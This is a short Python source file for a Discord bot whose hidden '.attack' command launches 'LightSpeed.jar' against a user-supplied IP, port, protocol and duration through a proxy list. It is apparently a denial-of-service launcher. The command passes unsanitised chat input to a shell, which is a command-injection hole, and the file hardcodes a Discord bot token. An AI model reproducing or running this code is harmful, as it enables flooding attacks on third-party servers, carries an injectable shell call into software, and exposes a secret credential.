import discord
import subprocess
import asyncio
from discord.ext import commands

intents = discord.Intents.all()  # This enables all intents, adjust as needed
bot = commands.Bot(command_prefix='.', intents=intents)

# Your .proxy command
@bot.command(hidden=True)
async def proxy(ctx):
    result = subprocess.run(['python3', 'ps.py'], capture_output=True, text=True)
    if result.returncode != 0:
        await ctx.send(f'Error executing `python3 ps.py`: {result.stderr}', delete_after=5)

# Your .attack command without embed message
@bot.command(hidden=True)
async def attack(ctx, ip_port: str, time: int, protocol: str):
    # Allocate at least 7 GB of RAM for the subprocess
    ram_mb = 7168  # 7 GB in MB
    mem_args = f'-Xmx{ram_mb}m'

    # Create the Java command
    java_command = (
        f'java -jar LightSpeed.jar {ip_port} 1 proxies.txt {ram_mb} {protocol} {time} 5000 1500 0'
    )

    # Run the Java command using subprocess
    subprocess.Popen(java_command, shell=True)

if __name__ == "__main__":
    bot.run("MTExOTAwOTkyMTQzOTEyMTQ4OQ.GbAUGB.Tixr45wTl_4IgCo94A4IrRPJ5ICxTT4g-6_Sj4")
